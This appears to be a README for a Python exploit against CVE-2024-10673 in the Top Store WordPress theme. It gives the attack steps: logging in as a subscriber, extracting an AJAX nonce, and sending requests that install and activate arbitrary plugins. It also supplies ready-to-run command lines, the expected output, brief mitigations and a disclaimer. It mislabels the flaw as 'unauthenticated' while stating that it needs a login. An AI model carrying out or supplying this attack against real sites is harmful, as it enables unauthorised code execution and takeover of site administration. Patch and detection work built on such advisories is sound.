

## 🔥 Overview
This script exploits **CVE-2024-10673**, a critical vulnerability found in the **Top Store WordPress Theme (<= 1.5.4)**. The flaw allows **authenticated users with subscriber-level access or higher** to install and activate arbitrary plugins via unprotected AJAX requests.

## ⚠️ Severity & Impact
- **Unauthenticated Plugin Installation**: Attackers with **subscriber privileges** can install plugins without admin approval.
- **Remote Code Execution (RCE) Possibility**: If a malicious plugin is installed, attackers may execute arbitrary code.
- **Privilege Escalation**: Attackers can install plugins that grant them administrative access.

## 🛠️ Features of This Exploit
- **Automates the attack** by extracting the required `nonce` dynamically.
- **Allows plugin selection** (users can specify which plugin to install and activate).
- **Supports JSON-formatted responses** for structured logging.
- **Handles errors gracefully**, ensuring robust execution.

## ⚡ How the Exploit Works
1. **Login to WordPress** using valid credentials.
2. **Extract the AJAX nonce** from `themes.php?page=thunk_started`.
3. **Send an AJAX request to install a plugin** (default: `hunk-companion` or user-defined plugin).
4. **Send another request to activate the plugin.**
5. **Output JSON responses** indicating success or failure.

## 🚀 Usage
```bash
usage: u.py [-h] -u URL -un USERNAME -p PASSWORD [-pl PLUGIN]

Exploit CVE-2024-10673 - WordPress Plugin Installation & Activation by : # By Nxploit | Khaled Alenazi

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target WordPress URL (e.g., http://192.168.100.74:888/wordpress)
  -un USERNAME, --username USERNAME
                        WordPress Username
  -p PASSWORD, --password PASSWORD
                        WordPress Password
  -pl PLUGIN, --plugin PLUGIN
                        Plugin slug to install and activate (default: hunk-companion)
```
### Examples
- **Install and activate the default plugin (`hunk-companion`)**:
  ```bash
  python exploit.py -u http://192.168.100.74:888/wordpress -un admin -p admin
  ```
- **Install and activate a specific plugin (`woocommerce`)**:
  ```bash
  python CVE-2024-10673.py -u http://192.168.100.74:888/wordpress -un admin -p admin -pl woocommerce
  ```

## 📝 Expected Output
```json
{"Logged in successfully"}
{"Fetching nonce value..."}
{"Nonce extracted": "abc123"}
{"Installing plugin: woocommerce..."}
{"Plugin woocommerce installed successfully"}
{"Activating plugin: woocommerce..."}
{"Plugin woocommerce activated successfully"}
{"Exploit completed successfully!"}
```

## 🔒 Mitigation
To secure your WordPress site:
- **Update to a patched version** of the Top Store theme.
- **Restrict subscriber permissions** to prevent unnecessary access.
- **Monitor installed plugins** for unauthorized changes.
- **Disable plugin installation** for non-administrators.

## ⚠️ Disclaimer
**This script is for educational and security research purposes only.** Unauthorized use against systems you do not own or have explicit permission to test is illegal. Use responsibly!

*By: Khaled Alenazi (Nxploit)*
